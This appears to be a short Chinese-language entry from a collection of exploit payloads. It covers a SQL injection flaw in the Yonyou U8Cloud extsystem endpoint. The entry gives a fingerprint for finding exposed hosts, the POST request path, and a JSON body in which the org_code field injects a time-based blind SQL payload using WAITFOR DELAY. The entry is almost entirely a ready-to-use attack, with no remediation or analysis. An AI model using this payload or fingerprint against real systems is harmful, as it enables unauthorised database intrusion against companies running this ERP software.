# 用友U8Cloudextsystem存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="U8C"`
- **请求**：`POST /u8cloud/extsystem/dst/ HTTP/1.1`

**Payload**
```
"exbilltype": "rm_gatherdailyreport",
"bill": [{
"data": {
"dept_code": "hello",
"org_code": "' ) WAITFOR DELAY '0:0:5' -- ",
"customer_code": "test",
"vouchdate": "2026-07-11",
"dwbm": "1001",
"details": [{"payment_code": "hello", "money": "100"}]
}]
```
- **响应特征**：200